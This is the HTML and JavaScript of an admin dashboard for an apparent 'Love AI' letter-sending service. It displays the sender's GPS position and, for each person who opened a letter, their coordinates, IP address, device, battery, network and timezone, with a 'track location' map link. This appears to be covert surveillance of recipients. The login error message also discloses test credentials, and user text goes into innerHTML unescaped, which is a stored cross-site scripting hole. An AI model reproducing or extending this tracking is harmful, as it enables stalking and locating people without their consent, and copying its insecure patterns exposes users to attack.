<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Admin Dashboard</title>
    <link rel="stylesheet" href="style.css">
    <style>
        .card {
            background: white;
            padding: 1rem;
            margin-bottom: 1rem;
            border-radius: 8px;
            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.05);
            border: 1px solid #eee;
        }

        .meta-info {
            font-size: 0.9rem;
            color: #666;
            margin-bottom: 0.5rem;
        }

        .view-list {
            list-style: none;
            padding: 0;
            margin-top: 0.5rem;
            background: #f9f9f9;
            border-radius: 4px;
        }

        .view-item {
            padding: 8px;
            border-bottom: 1px solid #eee;
            font-size: 0.85rem;
            display: flex;
            justify-content: space-between;
        }

        .view-item:last-child {
            border-bottom: none;
        }

        /* New styles for location boxes */
        .location-box {
            background-color: #2c3e50;
            /* Dark blue/grey */
            color: #ecf0f1;
            /* Light text */
            padding: 10px;
            border-radius: 5px;
            margin-top: 10px;
            font-size: 0.9rem;
            line-height: 1.4;
        }

        .location-box a {
            color: #3498db;
            /* Blue link */
            text-decoration: none;
        }

        .location-box a:hover {
            text-decoration: underline;
        }

        .warning-box {
            background-color: #f39c12;
            /* Orange */
            color: white;
            padding: 8px;
            border-radius: 5px;
            margin-top: 10px;
            font-size: 0.85rem;
        }
    </style>
</head>

<body>
    <header>
        <div class="brand">Love AI - Admin Panel üïµÔ∏è‚Äç‚ôÇÔ∏è</div>
    </header>

    <main>

        <!-- LOGIN SECTION -->
        <div id="login-section" class="glass-panel" style="max-width: 400px; margin: 0 auto; padding: 3rem;">
            <div style="font-size: 3rem; margin-bottom: 1rem;">üîê</div>
            <h2 style="font-family: var(--cursive-font); font-size: 2.5rem; color: var(--primary);">Acceso Admin</h2>
            <p style="margin-bottom: 2rem;">Ingresa tus credenciales maestras.</p>

            <div style="text-align: left; margin-bottom: 1rem;">
                <label style="color: var(--secondary); font-size: 0.8rem; letter-spacing: 1px;">USUARIO</label>
                <input type="text" id="email" placeholder="Usuario..."
                    style="width: 100%; padding: 12px; background: rgba(0,0,0,0.2); border: 1px solid rgba(255,255,255,0.1); color: white; border-radius: 8px; margin-top: 5px;">
            </div>

            <div style="text-align: left; margin-bottom: 2rem;">
                <label style="color: var(--secondary); font-size: 0.8rem; letter-spacing: 1px;">CONTRASE√ëA</label>
                <input type="password" id="password" placeholder="‚Ä¢‚Ä¢‚Ä¢‚Ä¢‚Ä¢‚Ä¢"
                    style="width: 100%; padding: 12px; background: rgba(0,0,0,0.2); border: 1px solid rgba(255,255,255,0.1); color: white; border-radius: 8px; margin-top: 5px;">
            </div>

            <button onclick="login()" class="action-btn" style="margin-top: 0; font-size: 1rem; padding: 12px;">üîì
                Entrar al Sistema</button>
            <p id="login-error" style="color: #ff4d6d; margin-top: 15px; font-weight: bold;"></p>
        </div>

        <!-- DASHBOARD SECTION (Hidden by default) -->
        <div id="dashboard-section" class="hidden">
            <h2 style="font-family: var(--cursive-font); font-size: 3rem; color: var(--primary); margin-bottom: 20px;">
                Panel de Control</h2>
            <button onclick="location.reload()"
                style="background: rgba(255,255,255,0.1); border:none; color:white; padding: 5px 15px; border-radius: 20px; cursor: pointer; margin-bottom: 20px;">üîÑ
                Refrescar Datos</button>
            <div id="image-list"></div>
        </div>

    </main>

    <script>
        // Check functionality immediately
        // document.addEventListener('DOMContentLoaded', () => { fetchImages(); }); // Don't fetch until logged in!

        async function login() {
            const email = document.getElementById('email').value;
            const password = document.getElementById('password').value;
            const errorMsg = document.getElementById('login-error');

            try {
                const res = await fetch('/api/login', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ email, password })
                });

                if (res.ok) {
                    // Success
                    document.getElementById('login-section').classList.add('hidden');
                    document.getElementById('dashboard-section').classList.remove('hidden');
                    fetchImages();
                } else {
                    errorMsg.textContent = "Credenciales incorrectas (Prueba 123 / 123)";
                }

            } catch (err) {
                console.error(err);
                errorMsg.textContent = "Error de conexi√≥n.";
            }
        }

        async function fetchImages() {
            try {
                const res = await fetch('/api/images');
                if (!res.ok) throw new Error("Unauthorized");
                const images = await res.json();
                renderImages(images);
            } catch (err) {
                console.log("Not logged in");
            }
        }

        function renderImages(images) {
            const container = document.getElementById('image-list');
            container.innerHTML = '';

            if (images.length === 0) {
                container.innerHTML = '<div style="text-align:center; padding:2rem;"><h3>üì≠ Sin datos</h3><p>No se han enviado cartas a√∫n.</p></div>';
                return;
            }

            images.reverse().forEach(img => {
                const div = document.createElement('div');
                div.className = 'glass-panel';
                div.style.textAlign = 'left';
                div.style.marginBottom = '2rem';
                div.style.maxWidth = '100%';
                div.style.padding = '20px';

                // IMAGE PREVIEW
                const imagePath = img.filename ? `/uploads/${img.filename}` : 'https://via.placeholder.com/150?text=No+Image';

                // TRACKING LOGIC
                let trackingHtml = '<div style="margin-top:15px;">';

                // 1. CREATOR LOCATION
                if (img.creatorLocation && img.creatorLocation.latitude) {
                    const { latitude, longitude } = img.creatorLocation;
                    trackingHtml += `
                    <div style="background: rgba(0, 255, 127, 0.1); border-left: 4px solid #00ff7f; padding: 10px; margin-bottom: 8px; border-radius: 4px;">
                        <div style="color: #00ff7f; font-weight: bold; font-size: 0.9rem;">üìç ORIGEN (Creador)</div>
                        <div style="font-size: 0.8rem; color: #ddd;">Lat: ${latitude.toFixed(5)}, Lng: ${longitude.toFixed(5)}</div>
                        <a href="https://www.google.com/maps?q=${latitude},${longitude}" target="_blank" style="color: #fff; font-size: 0.8rem; text-decoration: underline;">Ver en Mapa</a>
                    </div>`;
                } else {
                    trackingHtml += `
                    <div style="background: rgba(255, 255, 255, 0.05); padding: 10px; margin-bottom: 8px; border-radius: 4px; color:#aaa; font-style:italic;">
                        üìç Ubicaci√≥n del creador no detectada
                    </div>`;
                }

                // 2. VIEWER LOCATIONS
                if (img.views && img.views.length > 0) {
                    trackingHtml += `<div style="margin-top: 15px; font-weight: bold; color: #ffeb3b; font-size: 0.9rem;">üëÅÔ∏è VISITAS DETECTADAS (${img.views.length})</div>`;
                    img.views.forEach((v, index) => {
                        if (v.latitude && v.longitude) {
                            // Format simple hardware info
                            const d = v.details || {};
                            const techInfo = [
                                v.ip ? `üåê IP: ${v.ip}` : '',
                                d.platform ? `üíª ${d.platform}` : '',
                                d.vendor ? `üè¢ ${d.vendor}` : '',
                                d.touch ? `üëÜ ${d.touch}` : '',
                                d.screen ? `üñ•Ô∏è ${d.screen}` : '',
                                d.battery ? `üîã ${d.battery}` : '',
                                d.network ? `üì∂ ${d.network}` : '',
                                d.timezone ? `üïí ${d.timezone}` : ''
                            ].filter(Boolean).join(' | ');

                            trackingHtml += `
                            <div style="background: rgba(255, 235, 59, 0.1); border-left: 4px solid #ffeb3b; padding: 10px; margin-top: 5px; border-radius: 4px;">
                                <div style="display:flex; justify-content:space-between;">
                                    <span style="color: #ffeb3b; font-weight:bold;">Visita #${index + 1}</span>
                                    <span style="font-size:0.75rem; color:#ccc;">${new Date(v.timestamp).toLocaleString()}</span>
                                </div>
                                <div style="font-size: 0.8rem; color: #ddd; margin-top:2px;">Lat: ${v.latitude.toFixed(5)}, Lng: ${v.longitude.toFixed(5)}</div>
                                
                                <div style="font-size: 0.75rem; color: #aaa; margin-top:5px; border-top: 1px solid rgba(255,255,255,0.1); padding-top:4px; line-height: 1.4;">
                                    ${techInfo}
                                </div>
                                
                                <a href="https://www.google.com/maps?q=${v.latitude},${v.longitude}" target="_blank" style="color: #fff; font-size: 0.8rem; text-decoration: underline; display:block; margin-top:5px;">Rastrear Ubicaci√≥n</a>
                            </div>`;
                        } else {
                            const d = v.details || {};
                            const techInfo = [
                                v.ip ? `üåê IP: ${v.ip}` : '',
                                d.platform ? `üíª OS: ${d.platform}` : ''
                            ].filter(Boolean).join(' | ');

                            trackingHtml += `
                            <div style="padding: 5px; margin-top: 5px; font-size:0.8rem; color:#aaa;">
                                ‚ö†Ô∏è Visita registrada sin ubicaci√≥n - ${new Date(v.timestamp).toLocaleString()}<br>
                                <span style="font-size:0.7rem; color:#666;">${techInfo}</span>
                            </div>`;
                        }
                    });
                } else {
                    trackingHtml += `<div style="margin-top: 10px; color: #aaa; font-size: 0.9rem;">üëÅÔ∏è A√∫n sin visitas...</div>`;
                }

                // 3. REPLIES
                let repliesHtml = '';
                if (img.replies && img.replies.length > 0) {
                    repliesHtml += `<div style="margin-top: 20px; border-top: 1px solid rgba(255,255,255,0.1); padding-top: 10px;">`;
                    repliesHtml += `<div style="font-weight: bold; color: var(--secondary); margin-bottom: 10px;">üí¨ RESPUESTAS RECIBIDAS</div>`;
                    img.replies.forEach(r => {
                        repliesHtml += `
                        <div style="background: rgba(255, 77, 109, 0.1); padding: 10px; border-radius: 8px; margin-bottom: 5px;">
                            <span style="font-size: 1.1rem;">"${r.message}"</span>
                            <div style="font-size: 0.75rem; color: #aaa; margin-top: 5px; text-align: right;">${new Date(r.timestamp).toLocaleString()}</div>
                        </div>`;
                    });
                    repliesHtml += `</div>`;
                }

                trackingHtml += '</div>'; // Close tracking container

                // BUILD HTML GRID
                div.innerHTML = `
                    <div style="display: grid; grid-template-columns: 1fr 2fr; gap: 20px; align-items: start;">
                        <!-- LEFT COL: IMAGE -->
                        <div style="text-align: center;">
                            <img src="${imagePath}" style="width: 100%; border-radius: 12px; border: 2px solid rgba(255,255,255,0.1); box-shadow: 0 4px 15px rgba(0,0,0,0.3);">
                            <div style="margin-top: 10px; font-size: 0.8rem; color: #aaa;">ID: ${img.id}</div>
                            <div style="color: var(--primary); font-weight: bold; margin-top: 5px;">${img.isAiGenerated ? 'ü§ñ Generado por IA' : 'üì∑ Foto Subida'}</div>
                        </div>

                        <!-- RIGHT COL: INFO -->
                        <div>
                            <h3 style="margin: 0 0 10px 0; font-size: 1.4rem; color: white;">
                                Para: <span style="color: var(--secondary);">${img.recipientName || 'Desconocido'}</span>
                            </h3>
                            <div style="font-size: 0.9rem; color: #ccc; margin-bottom: 5px;">
                                <strong>De:</strong> ${img.senderName || 'An√≥nimo'}
                            </div>
                            <div style="font-size: 0.8rem; color: #666; margin-bottom: 15px;">
                                üìÖ ${new Date(img.uploadedAt).toLocaleString()}
                            </div>

                            ${trackingHtml}
                            ${repliesHtml}
                        </div>
                    </div>
                `;

                // Responsive fix for mobile dashboard
                if (window.innerWidth < 600) {
                    div.innerHTML = div.innerHTML.replace('grid-template-columns: 1fr 2fr', 'grid-template-columns: 1fr');
                }

                container.appendChild(div);
            });
        }
    </script>
</body>

</html>